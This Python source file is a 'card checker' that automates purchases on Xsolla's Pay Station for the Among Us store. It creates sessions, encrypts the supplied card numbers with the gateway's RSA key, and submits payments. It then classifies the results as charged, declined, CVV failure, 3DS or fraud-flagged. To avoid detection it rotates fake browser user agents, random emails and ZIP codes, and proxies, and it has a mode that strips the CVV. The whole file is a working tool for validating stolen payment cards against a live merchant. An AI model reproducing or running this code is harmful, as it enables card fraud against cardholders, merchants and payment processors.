"""
Xsolla Pay Station Checker
Gateway: Xsolla via Among Us store (project 91004)

Flow:
1. Create PayStation session via access_data (virtual_items SKU)
2. Extract token from meta-refresh redirect
3. Call directpayment to get RSA public key + signature
4. Encrypt card data with RSA-PKCS1-v1_5
5. Submit directpayment with encrypted card
6. Parse response for charge/decline/3DS
"""

import asyncio
import aiohttp
import random
import string
import re
import json
import base64
import urllib.parse
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from fake_useragent import UserAgent


class XsollaResultClassifier:
    CHARGED_KEYWORDS = [
        'payment successful', 'transaction completed', 'order confirmed',
        'payment accepted', 'successfully', 'paid', 'completed',
    ]

    DECLINED_KEYWORDS = [
        'card was declined', 'transaction declined', 'payment failed',
        'do not honor', 'insufficient funds', 'declined',
        'not authorized', 'pickup card', 'lost card', 'stolen card',
        'transaction not allowed', 'restricted card', 'card declined',
        'general decline', 'not permitted', 'exceeds withdrawal',
    ]

    CCN_KEYWORDS = [
        'invalid card number', 'incorrect card number',
        'card number is invalid', 'invalid pan', 'invalid card',
    ]

    CVV_KEYWORDS = [
        'invalid cvv', 'incorrect cvv', 'cvv mismatch',
        'security code', 'invalid cvc', 'incorrect cvc',
    ]

    EXPIRED_KEYWORDS = [
        'expired card', 'card has expired', 'expiration',
        'card is expired', 'past expiration',
    ]

    RISK_KEYWORDS = [
        'high risk', 'fraud', 'suspected fraud', 'risk',
        'blocked', 'security violation',
    ]

    RATE_LIMIT_KEYWORDS = [
        'rate limit', 'too many requests', 'try again later',
        'please wait',
    ]

    UNAVAILABLE_KEYWORDS = [
        'payment method is currently unavailable',
        'currently unavailable',
    ]

    @staticmethod
    def classify(response_data, errors=None):
        if errors:
            for err in errors:
                code = err.get('code', 0)
                msg = (err.get('message', '') or '').lower()

                if code == 2002 or any(kw in msg for kw in XsollaResultClassifier.UNAVAILABLE_KEYWORDS):
                    return 'ERROR', f'Payment method unavailable (code {code})'

                for kw in XsollaResultClassifier.CCN_KEYWORDS:
                    if kw in msg:
                        return 'CCN', f'Invalid Card Number | {msg[:80]}'
                for kw in XsollaResultClassifier.CVV_KEYWORDS:
                    if kw in msg:
                        return 'CVV', f'Incorrect CVV | {msg[:80]}'
                for kw in XsollaResultClassifier.EXPIRED_KEYWORDS:
                    if kw in msg:
                        return 'EXPIRED', f'Card Expired | {msg[:80]}'
                for kw in XsollaResultClassifier.RISK_KEYWORDS:
                    if kw in msg:
                        return 'RISK', f'Flagged High Risk | {msg[:80]}'
                for kw in XsollaResultClassifier.RATE_LIMIT_KEYWORDS:
                    if kw in msg:
                        return 'RATE_LIMIT', f'Rate Limited | {msg[:80]}'
                for kw in XsollaResultClassifier.DECLINED_KEYWORDS:
                    if kw in msg:
                        return 'DECLINED', f'{msg[:100]}'

                if code == 4010:
                    return 'DECLINED', f'Payment Declined | {msg[:80]}'

                if code in (1000, 1001, 1002, 1003, 1004):
                    return 'ERROR', f'Xsolla error {code} | {msg[:80]}'

                return 'DECLINED', f'Error {code} | {msg[:80]}'

        if isinstance(response_data, dict):
            status = response_data.get('status')
            if status == 'done' or status == 'invoice_created':
                return 'CHARGED', 'Payment Accepted'

            tds = response_data.get('threeDSForm')
            if tds:
                return '3DS', '3D Secure Required'

            invoice = response_data.get('invoiceCreated')
            if invoice:
                return 'CHARGED', 'Invoice Created'

        return 'UNKNOWN', 'Unclassified response'


class XsollaChecker:
    SITE_NAME = "Xsolla"
    PROJECT_ID = 91004
    SKU = "half_crew_package"

    def __init__(self):
        self.ua = UserAgent(browsers=['chrome'], os=['windows'], platforms=['pc'])

    def _random_email(self):
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        num = random.randint(10, 99)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        return f"{user}{num}@{random.choice(domains)}"

    def _get_headers(self, referer=None):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': referer or 'https://among-us.xsolla.site/',
        }

    async def _create_session(self, session):
        access_data = json.dumps({
            "settings": {"project_id": self.PROJECT_ID},
            "purchase": {
                "virtual_items": {
                    "items": [{"sku": self.SKU, "amount": 1}]
                }
            }
        })
        encoded = urllib.parse.quote(access_data)
        url = f'https://secure.xsolla.com/paystation2/?access_data={encoded}'

        async with session.get(url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=20),
                               headers=self._get_headers()) as resp:
            html = await resp.text()
            final_url = str(resp.url)

        token_match = re.search(r'token=([^"&\s]+)', final_url)

        if not token_match:
            token_match = re.search(r'token=([^"&\s]+)', html)

        if not token_match:
            meta_match = re.search(r'content="[^"]*url=([^"]+)"', html)
            if meta_match:
                redirect_url = meta_match.group(1)
                token_match = re.search(r'token=([^"&\s]+)', redirect_url)

        if not token_match:
            return None
        return token_match.group(1)

    async def _get_form_data(self, session, token):
        dp_data = {
            'access_token': token,
            'pid': '3638',
            'card_number': '4',
            'card_year': '28',
            'card_month': '01',
            'cvv': '0',
        }

        async with session.post('https://secure.xsolla.com/paystation2/api/directpayment',
                                data=dp_data,
                                timeout=aiohttp.ClientTimeout(total=15),
                                headers={
                                    'User-Agent': self.ua.random,
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'Origin': 'https://secure.xsolla.com',
                                    'Referer': f'https://secure.xsolla.com/paystation4/?token={token}',
                                }) as resp:
            content_type = resp.headers.get('Content-Type', '')
            if 'json' not in content_type:
                text = await resp.text()
                print(f"[{self.SITE_NAME}] Non-JSON form response: {resp.status} | {text[:100]}", flush=True)
                return None, None, {}
            result = await resp.json()

        form = result.get('form', {})
        pk_b64 = form.get('public_key', {}).get('value', '')
        signature = form.get('signature', {}).get('value', '')

        if not pk_b64:
            return None, None, {}

        hidden_fields = {}
        for k, v in form.items():
            if isinstance(v, dict):
                val = v.get('value', '')
                if val is not None and val != '' and k not in ('card_number', 'card_year', 'card_month', 'cvv', 'public_key'):
                    hidden_fields[k] = str(val)

        return pk_b64, signature, hidden_fields

    def _encrypt_card(self, pk_b64, cc, mes, ano, cvv=None, skip_cvv=False):
        pk_pem = base64.b64decode(pk_b64).decode()
        pub_key = serialization.load_pem_public_key(pk_pem.encode(), backend=default_backend())

        card_obj = {
            "card_number": cc,
            "card_year": ano,
            "card_month": mes,
        }
        if cvv and not skip_cvv:
            card_obj["cvv"] = cvv

        card_json = json.dumps(card_obj)
        encrypted = pub_key.encrypt(card_json.encode(), padding.PKCS1v15())
        return base64.b64encode(encrypted).decode()

    async def check_card(self, cc, mes, ano, cvv=None, proxy=None, skip_cvv=False):
        masked = f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else f"***{cc[-4:]}"
        card_display = f"{masked}|{mes}|{ano}|***"
        mode = " [NO-CVV]" if skip_cvv else ""
        print(f"[{self.SITE_NAME}]{mode} Checking: {card_display}", flush=True)

        connector = None
        if proxy:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            except Exception as e:
                print(f"[{self.SITE_NAME}] Proxy error: {e}", flush=True)
                connector = aiohttp.TCPConnector()
        else:
            connector = aiohttp.TCPConnector()

        timeout = aiohttp.ClientTimeout(total=60)
        jar = aiohttp.CookieJar(unsafe=True)

        try:
            async with aiohttp.ClientSession(
                timeout=timeout,
                cookie_jar=jar,
                connector=connector,
                headers=self._get_headers()
            ) as session:

                print(f"[{self.SITE_NAME}] Creating PayStation session...", flush=True)
                token = await self._create_session(session)
                if not token:
                    return 'ERROR', 'Failed to create PayStation session (no token)'

                print(f"[{self.SITE_NAME}] Got token: {token[:20]}...", flush=True)

                print(f"[{self.SITE_NAME}] Fetching RSA key + form data...", flush=True)
                pk_b64, signature, hidden_fields = await self._get_form_data(session, token)
                if not pk_b64:
                    return 'ERROR', 'Failed to get RSA public key'

                print(f"[{self.SITE_NAME}] Encrypting card data...", flush=True)

                if len(ano) == 2:
                    ano = f"20{ano}"

                encrypted_card = self._encrypt_card(pk_b64, cc, mes, ano, cvv, skip_cvv)

                email = self._random_email()

                payment_data = dict(hidden_fields)
                payment_data.update({
                    'access_token': token,
                    'pid': '3638',
                    'xps_encrypted_card': encrypted_card,
                    'email': email,
                    'v1': '',
                    'zip': str(random.randint(10001, 99999)),
                })

                cvv_status = "CVV stripped" if skip_cvv else "CVV included"
                print(f"[{self.SITE_NAME}] Submitting payment ({cvv_status})...", flush=True)

                async with session.post(
                    'https://secure.xsolla.com/paystation2/api/directpayment',
                    data=payment_data,
                    timeout=aiohttp.ClientTimeout(total=30),
                    headers={
                        'User-Agent': self.ua.random,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://secure.xsolla.com',
                        'Referer': f'https://secure.xsolla.com/paystation4/?token={token}',
                    }
                ) as resp:
                    content_type = resp.headers.get('Content-Type', '')
                    if 'json' not in content_type:
                        text = await resp.text()
                        return 'ERROR', f'Non-JSON response ({resp.status}): {text[:60]}'
                    result = await resp.json()

                errors = result.get('errors', [])
                if errors:
                    result_type, result_msg = XsollaResultClassifier.classify(result, errors)
                    err_msg = errors[0].get('message', 'Unknown error')[:80]
                    print(f"[{self.SITE_NAME}] Error: {err_msg}", flush=True)
                    return result_type, f'{result_msg} | ...{cc[-4:]}'

                tds = result.get('threeDSForm')
                if tds:
                    print(f"[{self.SITE_NAME}] 3DS required!", flush=True)
                    return '3DS', f'3D Secure Required | ...{cc[-4:]}'

                status = result.get('status')
                invoice = result.get('invoiceCreated')
                if status == 'done' or invoice:
                    print(f"[{self.SITE_NAME}] CHARGED!", flush=True)
                    return 'CHARGED', f'Payment Accepted | ...{cc[-4:]}'

                text_all = result.get('textAll', {})
                error_texts = text_all.get('error', [])
                if error_texts:
                    err_val = error_texts[0].get('value', '') if isinstance(error_texts[0], dict) else str(error_texts[0])
                    result_type, result_msg = XsollaResultClassifier.classify(
                        result, [{'code': 0, 'message': err_val}]
                    )
                    return result_type, f'{result_msg} | ...{cc[-4:]}'

                result_type, result_msg = XsollaResultClassifier.classify(result)
                return result_type, f'{result_msg} | ...{cc[-4:]}'

        except asyncio.TimeoutError:
            return 'ERROR', 'Request timed out'
        except aiohttp.ClientError as e:
            return 'ERROR', f'Connection error: {str(e)[:60]}'
        except Exception as e:
            print(f"[{self.SITE_NAME}] Exception: {e}", flush=True)
            return 'ERROR', f'Exception: {str(e)[:60]}'


if __name__ == '__main__':
    import sys

    async def main():
        if len(sys.argv) < 2:
            print("Usage: python xsolla_checker.py CC|MM|YY|CVV")
            return

        card_input = sys.argv[1]
        parts = card_input.split('|')
        if len(parts) != 4:
            print("Invalid format. Use: CC|MM|YY|CVV")
            return

        cc, mm, yy, cvv = parts

        checker = XsollaChecker()
        result_type, result_msg = await checker.check_card(cc, mm, yy, cvv)
        print(f"\n{'='*60}")
        print(f"Result: {result_type}")
        print(f"Details: {result_msg}")

    asyncio.run(main())
